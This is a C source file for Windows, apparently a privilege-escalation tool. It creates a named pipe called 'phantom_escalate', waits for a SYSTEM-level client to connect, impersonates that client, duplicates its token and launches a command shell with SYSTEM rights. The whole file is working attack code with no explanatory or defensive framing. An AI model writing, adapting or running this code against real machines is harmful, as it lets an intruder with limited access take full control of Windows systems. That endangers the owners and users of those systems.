#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\phantom_escalate"
#define CMD_PATH  L"C:\\Windows\\System32\\cmd.exe"

int main() {
    HANDLE hPipe = CreateNamedPipeW(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Pipe creation failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Waiting for SYSTEM client to connect...\n");
    BOOL connected = ConnectNamedPipe(hPipe, NULL) ? TRUE :
                     (GetLastError() == ERROR_PIPE_CONNECTED);

    if (!connected) {
        printf("[-] Client connection failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("[+] SYSTEM client connected. Awaiting handshake...\n");

    char buf[1];
    DWORD bytesRead;
    BOOL read = ReadFile(hPipe, buf, 1, &bytesRead, NULL);

    if (!read || bytesRead == 0) {
        printf("[-] ReadFile failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("[*] Handshake received. Attempting impersonation...\n");

    if (ImpersonateNamedPipeClient(hPipe)) {
        HANDLE hToken, hDupToken;
        if (OpenThreadToken(GetCurrentThread(),
            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
            FALSE, &hToken)) {

            if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                SecurityImpersonation, TokenPrimary, &hDupToken)) {

                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                BOOL success = CreateProcessWithTokenW(
                    hDupToken, 0, CMD_PATH, NULL,
                    CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

                if (success) {
                    printf("[+] SYSTEM shell launched!\n");
                } else {
                    printf("[-] Shell launch failed: %lu\n", GetLastError());
                }

                CloseHandle(hDupToken);
            } else {
                printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
            }

            CloseHandle(hToken);
        } else {
            printf("[-] OpenThreadToken failed: %lu\n", GetLastError());
        }

        RevertToSelf();
    } else {
        printf("[-] Impersonation failed: %lu\n", GetLastError());
    }

    CloseHandle(hPipe);
    return 0;
}
